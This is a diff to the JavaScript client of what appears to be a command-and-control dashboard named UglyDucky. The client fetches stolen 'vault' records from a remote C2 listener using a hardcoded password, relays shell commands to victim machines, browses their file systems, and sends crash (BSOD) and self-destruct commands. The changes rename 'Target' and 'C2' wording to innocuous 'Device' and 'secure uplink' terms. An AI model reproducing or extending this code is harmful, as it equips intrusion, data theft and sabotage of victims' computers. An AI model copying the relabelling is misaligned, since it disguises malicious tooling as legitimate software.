@@ -1,10 +1,13 @@
 // File: app.js
 // ==================================================================
-// --- LOCAL SETTINGS & CONFIGURATION ---
+// --- SYSTEM CONFIGURATION ---
 // ==================================================================
-let C2_LISTENER_URL = localStorage.getItem('ducky_c2_url') || "https://uglyducky-c2.onrender.com"; 
-let DASHBOARD_PASSWORD = localStorage.getItem('ducky_c2_pwd') || "ducky_admin_2024"; 
-let ENABLE_CRT = localStorage.getItem('ducky_c2_crt') !== 'false'; // Defaults to true
+// These values are securely baked into the client to prevent user tampering.
+const C2_LISTENER_URL = "https://uglyducky-c2.onrender.com"; 
+const DASHBOARD_PASSWORD = "ducky_admin_2024"; 
+
+// Only visual preferences are loaded from local storage
+let ENABLE_CRT = localStorage.getItem('ducky_c2_crt') !== 'false'; 
 
 // --- GLOBAL STATE ---
 let activeNodeId = null; 
@@ -50,17 +53,14 @@ document.addEventListener("DOMContentLoaded", () => {
     initResizers();
     initFloatingWindowManager();
     
-    // Start on the home view
     switchView('home'); 
     renderNodesList(); 
 });
 
 // ==========================================
-// SETTINGS & UI NAVIGATION
+// PREFERENCES & UI NAVIGATION
 // ==========================================
 function applySettingsToUI() {
-    document.getElementById('setting-c2-url').value = C2_LISTENER_URL;
-    document.getElementById('setting-dashboard-pwd').value = DASHBOARD_PASSWORD;
     document.getElementById('setting-crt').checked = ENABLE_CRT;
     
     const scanlines = document.getElementById('scanlines');
@@ -71,25 +71,17 @@ function applySettingsToUI() {
 }
 
 window.saveSettings = function() {
-    C2_LISTENER_URL = document.getElementById('setting-c2-url').value.trim();
-    DASHBOARD_PASSWORD = document.getElementById('setting-dashboard-pwd').value.trim();
     ENABLE_CRT = document.getElementById('setting-crt').checked;
-
-    localStorage.setItem('ducky_c2_url', C2_LISTENER_URL);
-    localStorage.setItem('ducky_c2_pwd', DASHBOARD_PASSWORD);
     localStorage.setItem('ducky_c2_crt', ENABLE_CRT);
 
     applySettingsToUI();
-    showToast("Settings saved to local storage.", "success");
+    showToast("Preferences saved.", "success");
 };
 
 window.switchView = function(viewId) {
-    // Hide all views
     document.querySelectorAll('.view-section').forEach(el => el.classList.remove('active'));
-    // Remove active state from all nav buttons
     document.querySelectorAll('.nav-btn').forEach(el => el.classList.remove('active'));
     
-    // Activate target view
     document.getElementById('view-' + viewId).classList.add('active');
     document.getElementById('nav-' + viewId).classList.add('active');
     
@@ -104,18 +96,11 @@ window.switchView = function(viewId) {
 };
 
 function updateHomeStats() {
-    const urlDisplay = document.getElementById('stat-c2-url');
-    if(urlDisplay) {
-        urlDisplay.innerText = C2_LISTENER_URL.replace('https://', '').replace('http://', '');
-    }
     const nodesDisplay = document.getElementById('stat-nodes');
-    if(nodesDisplay) {
-        nodesDisplay.innerText = allNodes.length;
-    }
+    if(nodesDisplay) nodesDisplay.innerText = allNodes.length || '--';
+    
     const recordsDisplay = document.getElementById('stat-records');
-    if(recordsDisplay) {
-        recordsDisplay.innerText = globalData.length;
-    }
+    if(recordsDisplay) recordsDisplay.innerText = globalData.length || '--';
 }
 
 // ==========================================
@@ -233,7 +218,7 @@ function renderMap() {
 }
 
 // ==========================================
-// AUTHENTICATION & FETCHING
+// DEVICE AUTHENTICATION & FETCHING
 // ==========================================
 document.getElementById("deviceId").addEventListener("keypress", function(e) {
     if (e.key === "Enter") { e.preventDefault(); fetchData(); }
@@ -241,7 +226,7 @@ document.getElementById("deviceId").addEventListener("keypress", function(e) {
 
 async function fetchData() {
     const deviceId = document.getElementById('deviceId').value.trim();
-    if (!deviceId) return showToast("Target Identifier missing.", "error");
+    if (!deviceId) return showToast("Device ID missing.", "error");
 
     const statusMsg = document.getElementById('statusMsg');
     const btn = document.getElementById('connectBtn');
@@ -259,9 +244,9 @@ async function fetchData() {
     renderMap(); renderNodesList(); updateHomeStats();
 
     statusMsg.classList.remove('hidden');
-    statusMsg.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin text-cyberBlue mr-2"></i>Contacting Render Server...';
+    statusMsg.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin text-cyberBlue mr-2"></i>Establishing secure uplink...';
     btn.disabled = true;
-    btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Working';
+    btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Connecting';
 
     try {
         const nodeResponse = await fetch(`${C2_LISTENER_URL}/node/${deviceId}`, {
@@ -270,8 +255,7 @@ async function fetchData() {
         });
         
         if (!nodeResponse.ok) {
-            const errData = await nodeResponse.json().catch(() => ({}));
-            throw new Error(`[Status: ${nodeResponse.status}] ${errData.error || nodeResponse.statusText}`);
+            throw new Error(`Device ID not found or offline.`);
         }
         
         const nodeData = await nodeResponse.json();
@@ -285,14 +269,14 @@ async function fetchData() {
         
         selectNode(activeNodeId); 
 
-        statusMsg.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin text-cyberBlue mr-2"></i>Node found. Decrypting vault logs...';
+        statusMsg.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin text-cyberBlue mr-2"></i>Uplink stable. Synchronizing Vault...';
         
         const logsResponse = await fetch(`${C2_LISTENER_URL}/logs/${deviceId}`, {
             method: 'GET',
             headers: { "X-Dashboard-Password": DASHBOARD_PASSWORD, "Accept": "application/json" }
         });
         
-        if (!logsResponse.ok) throw new Error("API Error fetching vault logs.");
+        if (!logsResponse.ok) throw new Error("Synchronization failed.");
         
         globalData = await logsResponse.json();
         updateHomeStats();
@@ -308,24 +292,24 @@ async function fetchData() {
         };
 
         if (globalData.length === 0) {
-            statusMsg.innerHTML = `<i class="fa-solid fa-triangle-exclamation text-yellow-500 mr-2"></i>Node active, but no vault data exists yet.`;
-            showToast("Node is active but has no vault data.", "error");
+            statusMsg.innerHTML = `<i class="fa-solid fa-triangle-exclamation text-yellow-500 mr-2"></i>Device active, but no vault data exists yet.`;
+            showToast("Device is active but has no vault data.", "error");
             setTimeout(transitionToControlPanel, 1000); 
         } else {
             statusMsg.innerHTML = `<i class="fa-solid fa-lock-open text-green-500 mr-2"></i>Vault Decrypted. [${globalData.length} records]`;
             document.getElementById('exportBtn').classList.remove('hidden');
             buildFilters();
             renderCards(globalData, document.getElementById('output'));
-            showToast("Authentication successful! Data loaded.", "success");
+            showToast("Link successful! Data loaded.", "success");
             setTimeout(transitionToControlPanel, 1000); 
         }
 
     } catch (error) {
         statusMsg.innerHTML = `<i class="fa-solid fa-triangle-exclamation text-red-500 mr-2"></i>Error: ${error.message}`;
-        showToast("Backend Connection Failed", "error");
+        showToast("Device Not Found", "error");
     } finally {
         btn.disabled = false;
-        btn.innerHTML = '<i class="fa-solid fa-unlock-keyhole mr-2"></i> Decrypt';
+        btn.innerHTML = '<i class="fa-solid fa-unlock-keyhole mr-2"></i> Access';
     }
 }
 
@@ -338,7 +322,7 @@ function renderNodesList() {
     container.innerHTML = '';
     
     if (allNodes.length === 0) {
-        container.innerHTML = `<p class="text-gray-500 p-4 text-xs font-mono">Authenticate with a Target ID to begin.</p>`;
+        container.innerHTML = `<p class="text-gray-500 p-4 text-xs font-mono">Authenticate a Device ID to begin.</p>`;
         return;
     }
 
@@ -379,8 +363,8 @@ function renderNodesList() {
 // TERMINAL LOGIC (REAL PASSTHROUGH)
 // ==========================================
 window.selectNode = function(nodeId) {
-    appendTerminalText(`Session established. Authenticated as: ${nodeId}`, "system");
-    document.getElementById('terminal-connection-msg').innerText = `Connected to ${nodeId} via secure reverse proxy`;
+    appendTerminalText(`Session established. Bound to Device: ${nodeId}`, "system");
+    document.getElementById('terminal-connection-msg').innerText = `Encrypted link active for ${nodeId}`;
     
     document.getElementById('fs-active-node').innerText = nodeId;
     requestDirectoryListing('DRIVES');
@@ -443,7 +427,7 @@ window.executeTermCommand = function(inputEl) {
         if(val.toLowerCase() === 'clear' || val.toLowerCase() === 'cls') { 
             const term = document.getElementById('terminal-output');
             term.innerHTML = `
-                <div class="text-cyberBlue">UglyDucky Shell v3.0.0</div>
+                <div class="text-cyberBlue">UglyDucky Shell v3.0</div>
                 <div class="mt-2 text-green-400 terminal-prompt flex flex-shrink-0">
                     <span class="mr-2">C:\\></span> <span class="cursor-blink"></span>
                 </div>`;
@@ -452,7 +436,7 @@ window.executeTermCommand = function(inputEl) {
         }
         
         if(val.toUpperCase() === 'BSOD' || val.toUpperCase() === 'BURN') {
-            termLog(`Forwarding critical payload to C2 server...`);
+            termLog(`Forwarding critical payload to device...`);
             sendCommandToNode(activeNodeId, val.toUpperCase() === 'BURN' ? "SELF_DESTRUCT" : "BSOD");
         } else {
             termLog(`Executing command on target: ${val}...`);
@@ -464,7 +448,7 @@ window.executeTermCommand = function(inputEl) {
 };
 
 // ==========================================
-// C2 COMMAND FUNCTIONS
+// COMMAND FUNCTIONS
 // ==========================================
 async function sendCommandToNode(deviceId, command) {
     if (!deviceId) return showToast("No active node selected!", "error");
@@ -476,7 +460,7 @@ async function sendCommandToNode(deviceId, command) {
             body: JSON.stringify({ device_id: deviceId, command: command })
         });
         
-        if (!response.ok) throw new Error(`Server responded with ${response.status}`);
+        if (!response.ok) throw new Error(`Network responded with ${response.status}`);
     } catch (error) {
         showToast(`Failed to send command.`, "error");
         termLog(`[ERROR] Failed to send command: ${error.message}`);
@@ -1053,7 +1037,7 @@ window.resetLayout = function() {
 };
 
 // ==========================================
-// FLOATING WINDOW MANAGER (NEW LOGIC)
+// FLOATING WINDOW MANAGER
 // ==========================================
 window.toggleFloatingMode = function() {
     const btn = document.getElementById('btn-floating-toggle');
